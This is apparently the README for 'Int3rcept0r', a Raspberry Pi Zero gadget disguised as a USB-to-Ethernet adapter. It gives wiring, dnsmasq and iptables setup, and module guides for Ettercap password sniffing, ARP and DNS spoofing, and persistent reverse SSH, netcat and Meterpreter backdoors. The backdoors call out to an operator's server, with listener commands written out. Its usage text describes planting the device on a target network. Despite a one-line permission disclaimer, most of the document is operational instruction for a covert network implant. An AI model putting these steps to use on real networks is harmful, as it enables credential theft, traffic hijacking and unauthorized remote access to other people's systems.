# Int3rcept0r
Raspberry Pi Zero as a USB to Ethernet Gadget that can capture and hijack traffic as well as acting as a backdoor into the network it is connected too.

[Donate and help me fund future projects](https://www.justgiving.com/crowdfunding/cupcaken1nja)

This is a Raspberry Pi Zero and Ethernet shield that has functionality similar to the Hak 5 Lan Turtle.
It is recognised and acts as a USB to Ethernet adaptor and captures traffic that is passed through it. I have created a pretty basic script to automatically use certain tools on boot as well as multiple options for remote Administration.
This tool is to only be used with permission and not for illegal use.
Ideally this would be a cheap tool for penetration testers as well as a small project for hobbyists.
I have uploaded this merely as a proof of concept that it is possible.

## What it does
On a network where computers access the internet through Ethernet this device would be plugged into the target computers USB port and then the Ethernet cable that is plugged into the computer would be plugged into the other end off the device. Now the computer will still be able to access the internet and network however it's traffic would be intercepted and monitored by the device. 

## How it works
It works using the Raspberry Pi Zeros' support for USB gadget modes. It uses the g_ether module to be recognised as a USB to Ethernet adaptor and therefore can be programmed through USB and have a fixed address as well as allocating an address to the connected computer. By connecting an ENC28J60 Ethernet module to the Raspberry Pi (the latest version of Jessie already has the required drivers for this module) we can then create a network bridge between the two interfaces and use specific IP forwarding and use DNSMASQ as a local DHCP server and local DNS server to forward all traffic from the Ethernet interface over to the USB interface allowing the connected computer to access the internet as well as allowing you to run certain MITM tools and have fully functioning backdoors to give an access point into the network the Pi is connected too.

### Modules:
- Password Sniffing
- ARP Spoofing
- DNS Spoofing
- DNS Spoofing (using dnsmasq)
- Reverse SSH
- Reverse Netcat
- Reverse TCP Meterpreter
- USB power only


## Requirements
- Raspberry Pi Zero with GPIO headers
- Female to Female Jumper cables
- ENC28J60 Ethernet shield, 10 pin version can be found [here](https://www.amazon.co.uk/SunFounder-ENC28J60-Ethernet-Network-Arduino/dp/B00GAXAQOQ/ref=sr_1_1?ie=UTF8&qid=1503523823&sr=8-1&keywords=enc28j60)
- Micro USB to USB cable
- Micro SD card 8GB plus

## Set Up
Follow these instructions to set up the Int3rcept0r Gadget.
### Hardware
Firstly you need to connect the ENC28J60 and Raspberry Pi together. To do this follow this diagram:
```
Pi            ENC28J60     Colour
---------------------------------
+3V3          VCC          Red
GPIO10/MOSI   SI           Green
GPIO9/MISO    SO           Yellow
GPIO11/SCLK   SCK          Blue
GND           GND          Black

GPIO25        INT          Blue
CE0#/GPIO8    CS           Green
```
The ENC28J60 connections are printed on the PCB itself. You can find the Pi's pinout bellow.

![40 Pin Raspberry Pi pinout](http://i.imgur.com/CUgky6W.jpg)

For more information about connecting the Ethernet shield to the Raspberry Pi you click [here](http://www.instructables.com/id/Super-Cheap-Ethernet-for-the-Raspberry-Pi/)
But only follow the wiring instructions.

Make sure your micro USB to USB cable is plugged into the micro USB slot that has USB written next to it and not PWR!

### Software
Once you have connected the Raspberry Pi and ENC28J60 together you will need to image a micro SD card with the latest version of Rasbian Jessie. The Rasbian download page can be found [here](rasbian download link)
You can use either the lite version or the Desktop version however I found that the Desktop version download is corrupted so i would recommend using the lite version.
It is important to bear in mind that if you have already had an operating system on the SD card you will want to remove any partitions and reformat the SD card.
For more information about writing an operating system to an SD card follow this [tutorial](http://www.makeuseof.com/tag/install-operating-system-raspberry-pi/) 
However a quick google search can bring up many options for doing this.

Once you have flashed your micro SD card you will want to plug this into your computer. You should see that there is a partition and you should have a mass storage with the file system and also a boot partition.
You will want to go to the boot partition and using a text editor and edit the file config.txt. You will want to add the next three lines to the bottom of the file.
```
dtparam=spi=on
dtoverlay=enc28j60
dtoverlay=dwc2
```
and save the file.

Now open cmdline.txt in a text editor and just after ```rootwait``` add a space and then ```modules-load=dwc2,g_ether``` now save and close the file.

Before you have finished you will want to create a blank file with no file extension called ```ssh``` this allows you too SSH into your Pi when it boots up.

Now if you plug your Pi into your computer and you have Bonjour installed you will be able to SSH into it with the address raspberrypi.local, however if you do not have Bonjour or this does not work you can plug your Raspberry Pi into a power source and connect it via Ethernet into your network. Now by either using NMAP or view your attached devices from your router, you should be able to SSH into it using it's local IP as though it is another computer on the network.
Username ```pi```
Password ```raspberry```

Now that you have given internet to the Raspberry Pi we want to bridge the connection to the usb0 interface so that you can access the internet from the USB end of the device.
However first we will setup the packages and tools we will need.
Firstly you will want netcat-traditional to run when you use netcat nc commands. To do this type ```sudo update-alternatives --config nc```
Now select the option ```/bin/nc.traditional```

Now we will install the other requirements, to do this type ```sudo apt-get install ettercap-text-only dnsmasq -y```
Now we have all the software installed.

To bridge the connection between the th0 and usb0 interfaces first type ```sudo nano /etc/network/interfaces```
and add the following section to the bottom or modify the section that is already there under the usb0 interface.
```
allow-hotplug usb0  
iface usb0 inet static  
    address 192.168.220.1
    netmask 255.255.255.0
    network 192.168.220.0
    broadcast 192.168.220.255
``` 
and save and exit.

Before we edit DNSMASQ's configuration we will first make a backup of the original configuration. Therefore run ```sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig```
Now we will create our own configurations. Therefore run ```sudo nano /etc/dnsmasq.conf```
and add the following section
```
interface=usb0	#Use interface usb0
listen-address=192.168.220.1	#Address to listen on
bind-interfaces	#Bind to the interface
server=8.8.8.8	#Uses Googles DNS
domain-needed	#Don't forward short names
bogus-priv	#Drop the non-routed address spaces
dhcp-range=192.168.220.50,192.168.220.150,12h	#Ip range and lease time
``` 
Now save and exit.

Now we want to configure the Raspberry Pi's firewall so that it will forward all traffic from our usb0 connection to our eth0 connection. To do this we start by enabling IP forwarding so run ```sudo nano /etc/sysctl.conf```
and replace ```#net.ipv4.ip_forward=1```
with ```net.ipv4.ip_forward=1```
Now save and exit.
Now we want to enable IP forwarding immediately so run ```sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"```

Now IP forwarding is enabled we will set up our IP table rules, to do this run the following commands.
```
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o usb0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i usb0 -o eth0 -j ACCEPT
```
If you get errors you will want to run ```sudo reboot``` and re execute the above lines.

Now we want to save our set of rules. To do this run ```sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"```

Now that these rules are saved we want to load them on every boot. Therefore run ```sudo nano /etc/rc.local```
Now find where it says ```exit 0``` at the bottom, and above that write ```iptables-restore < /etc/iptables.ipv4.nat``` now save and exit.

Now we want to add a few files that allow the main program to work. So first type ```sudo nano /etc/dnsmasq.hosts```
If this file is empty type ```#dnsmasq host file``` and save and exit
If there are already things inside it then just leave the file as it is.

Now we will want to set up the SSH public keys so you can use the Reverse SSH module. To do this make sure you are logged in as user pi and run ```ssh-keygen``` when it asks for a file location leave it as the default.

Now we want to allow the Pi to SSH to another computer without asking the user for host authentication. To do this run ```sudo nano /etc/ssh/ssh_config``` and add this line to the bottom ```StrictHostKeyChecking no``` if it is already in the file either uncomment it or change it's value from yes to no.

Now that the network bridge is set up we need to start it. To do this run ```sudo service dnsmasq start```

and finally run ```sudo reboot```

Now if you plug the Pi into your computer and an Ethernet cable into your router, you should see that you can get an internet connection. To test this type ```ping 8.8.8.8``` into your own computers terminal. If it does not work you may want to double check that all of the files are correctly edited as it tells you in these instructions.

Once the Pi is bridging the connection you can now go and install my program that adds a small bit of functionality to this device. To do this log into the Pi as user pi. Now type ```cd /home/pi```.
Once you are here type ```sudo git clone https://github.com/CuPcakeN1njA/Int3rcept0r.git```
Now if you type ```ls``` you should see that there is a file called Int3rcept0r.
Finally you need to run ```cd Int3rcept0r```
Now run ```cd rev_net```
Now run ```sudo chmod +x nc.sh```
Now run ```cd /home/pi/Int3rcept0r/pas```
and then run ```sudo mkdir log```
Now run ```cd /home/pi/Int3rcept0r/arp```
and then run ```sudo mkdir log```
Once you have done all this the set up is complete and you have a fully working Int3rcept0r Gadget

## Usage
Once you plug your Raspberry Pi into your computer it may take a while but you should see that you have connected to an RDNIS/Ethernet Gadget and installed the drivers. If not you may have to do some research into installing the correct drivers for your operating system.

Now you should be able to ssh into 192.168.220.1 with the username ```pi``` and password ```raspberry```

Once you have connected and have an ssh shell you now have control of the Raspberry Pi.
If you run command "ls" and hit enter
You should see that you are in the home directory for the user Pi and there is one directory in it called Int3rcept0r.
Run ```cd Int3rcept0r```
Now if you run ```ls``` you will see the file structure of the main program.

To control your Pi and run the different modules run the command ```sudo python main.py```
Now you can set up the device so when it next runs it will be running the different modules. You can run multiple modules at once by running the program multiple times and selecting what you want to run.
To select a module just hit the number of the module you want and it will run the setup for that module.

## Module breakdown

I have written these instructions presuming that the host computer will be running a Linux distro however if you need help setting certain things up on another operating system there will be solutions on google. The majority of modules do not require any complicated setup and given you have the correct tools installed will run across multiple platforms with the same commands.

### Password Sniffing
This module uses Ettercaps unified sniffing on the eth0 interface to capture network traffic and save to a log file which you can retrieve later on. When you select it, the program will set the command to run on startup so that as soon as the Raspberry Pi has power it will start sniffing. It can detect a range off passwords: TELNET, FTP, POP3, 
RLOGIN, SSH1, ICQ, SMB, MySQL, HTTP, NNTP, X11, NAPSTER, IRC, 
RIP, BGP, SOCKS 5, IMAP 4, VNC, LDAP, NFS and SNMP

To use this module select it when running main.py
Once it has been selected the device will be armed
When you recover the device after collecting passwords you will find a log file at /home/pi/Int3rcept0r/pas/log/ followed by the date and time that the session began. You can now use Etterlog to find any passwords and other traffic that you may want that were recorded within this session.
Help on using Etterlog can be found [here](http://manpages.ubuntu.com/manpages/wily/man8/etterlog.8.html)

### ARP Spoofing
This module also uses Ettercap and its ability to ARP spoof an entire network and monitor all traffic. By selecting this module, on the next boot the Pi will attempt to ARP spoof the network it is connected to over Ethernet and log any traffic collecting passwords from other computers on the network.

Again once you have recovered the device there is a log file at /home/pi/Int3rcept0r/arp/log/ followed by the date the session started. This log file can be reviewed using Etterlog.

### DNS Spoofing
This module will DNS Spoof the traffic that is coming from the target computer.
To use this module modify the host file at /home/pi/Int3rcept0r/dns/hosts to the host file you want with the domain names and correlating IP addresses you want to spoof, before running the module. Now run the module from main.py. Now the Pi will be spoofing traffic with the host file that you created.

### DNS Spoofing(using dnsmasq) 
This module is very similar to DNS spoofing however instead of using the systems host file to spoof DNS it will use DNSMASQs host file and set DNSMASQ up to use it.
To use the module you do the same as DNS Spoofing and modify /home/pi/Int3rcept0r/dns/hosts to the host file you want. Now run the module using main.py.

This and the other DNS Spoofing module can not be run simultaneously.

### Reverse SSH
This module uses autossh to set up persistent reverse ssh. This can be used similar to other reverse backdoors however where normally you set up a listener you will enable ssh and create a user for the Pi to ssh into. Then when you log in as that user or ssh into that user you can ssh to the Pi through that user. You can also set up a VPS for the Pi to ssh into and then you ssh into the VPS and control the Pi from there.

To use this module you will want to create a user with restricted privileges. You can do this on your own computer which the backdoor will connect to. Or on a VPS which the backdoor will connect too.
To create a new user with restricted privileges, run the command ```sudo adduser --home /home/restricted_user restricted_user``` and set the password to ```restricted_user```. It is important that the username and password are ```restricted_user```. Now log in to that user either through ssh or using ```su - restricted_user```
Now we will set up public key authentication.
To find the correct public key you will want to run the command ```cat ~/.ssh/id_rsa.pub```on the Raspberry Pi logged in as user pi.
Now copy the output of the last command.
Now back on the host computer or VPS log in as restricted_user. 
Run ```mkdir ~/.ssh```
Now run ```nano ~/.ssh/authorized_keys```
Now paste the public key your have just copied into the file you are editing and then save an exit.

As a single line.
Save the file use CTRL+x and confirm the file name.

Now run the ssh module on the Pi and select Destination to the IP of your VPS or your own public IP. If you are using your own IP unless you are on the same network you will need to set up port forwarding which you can see how to do [here](http://www.wikihow.com/Set-Up-Port-Forwarding-on-a-Router)

Now set the VPS port to the port that you are running an ssh server. Leave it as 22 by just hitting enter. If you have changed it either on your VPS or home computer then you will want to change it otherwise the default for most ssh servers are 22.

Now set the tunnel port to a port of your choice. This is the port that you will be able to ssh into the Pi from the user restricted_user. Make sure you know what port this is as it is important you run the correct command to be able to ssh into the Pi.

Once this has been set up and when the Pi is deployed on the network you want. You will have to log in either through ssh to your VPS or as a local user on your own computer as restricted_user. Once you have logged in, provided the Pi has power if you run the command ```ssh -p (tunnel port) pi@127.0.0.1``` for example ssh -p 4444 pi@127.0.0.1 you should ssh into the Raspberry Pi and have an ssh session.

When you logout of the Pi provided the ssh server on the VPS or on your own computer is still enabled you will be able to ssh back into the pi from restricted_user whenever you want.

### Reverse Netcat
This is another backdoor module but instead of using ssh it uses Netcat which is a very simple TCP/UDP networking communication program. It allows us to create a very simple reverse TCP backdoor.

To use this module you will also have to set up port forwarding [Tutorial Here](http://www.wikihow.com/Set-Up-Port-Forwarding-on-a-Router).
Once this is done on your desired port you will want to run the module from main.py
When it asks for Destination you should enter the IP address of your router that has port forwarding enabled on it.
When it asks for the port you should set it to your desired port that is being port forwarded.
Once you have done this after planting the device  on the network you want you should run this command on your computer to set up the Netcat listener.
```nc -l -v -p (desired port)```
Now as long as the Pi has power you will receive a connection and have a shell.
Again this module is persistent therefore if you close the session you will be able to run the listener command again and open a new session.

### Reverse TCP Meterpreter
Another backdoor module this uses Metasploits multi handler to establish a reverse TCP Meterpreter backdoor. Once again you may need to port [port forward](http://www.wikihow.com/Set-Up-Port-Forwarding-on-a-Router)
To use it you just run the module from main.py
Select the Destination IP which is the computer that has Metasploit installed.
Select the  desired port which you will be listening on.
Now the Raspberry Pi will be armed you just have to set up the listener.
To do this start Metasploit ```msfconsole```
Now run ```use exploit/multi/handler```
Now run ```set payload python/meterpreter/reverse_tcp```
Now run ```set lhost (to your local IP)``` Your local IP can be found by typing ```ifconfig``` into your Terminal
Now run ```set lport (to the port that you want to listen on)``` This port must be the same as whichever port you are port forwarding
Now run ```exploit``` and you should see that you have began listening for connections. If the Raspberry Pi is turned on you will see after a short time you will have a Meterpreter backdoor and be able to control the Pi.

### Power Only
This module can be used if you do not want the target computer to have internet you only want the Raspberry pi to act as a backdoor into a network. This module still allocates an IP address to the connected computer and it will still show up as an Ethernet gadget however the internet connection will not be bridged. By still allowing the Pi to assign the connected computer an IP address it allows the Pi to still be programmed over USB therefore once you have used this module and want to change what the Pi is going to do you can still ssh into it with the IP address 192.168.220.1.
Another alternative to using this module would be to switch the micro USB port the micro USB to USB cable is plugged into however if you have soldered the micro USB to USB cable in place this is not possible therefore this module would allow for power only.

When using this module you will not be able to use the modules: Password Sniffing or DNS Spoofing with or without DNSMASQ. However you will still be able to ARP Spoof a network.

To run this module you just select and run it from main.py

### Reset to Default
This module resets the Pi so that it only acts as a USB to Ethernet adaptor. It will set the Pi to its default so that on the next boot there will be no other modules running.

To run this you just select it from main.py

## Donate maybe?
I hope I have explained how to run each module and what they do.
I apologise for the rubbish coding techniques and concepts.

If you feel this project was helpful/enjoyable I would appreciate if you could donate a little to help me there is a link bellow where you can do this.
[Donate Here](https://www.justgiving.com/crowdfunding/cupcaken1nja)

Peace 
CuPcakeN1njA
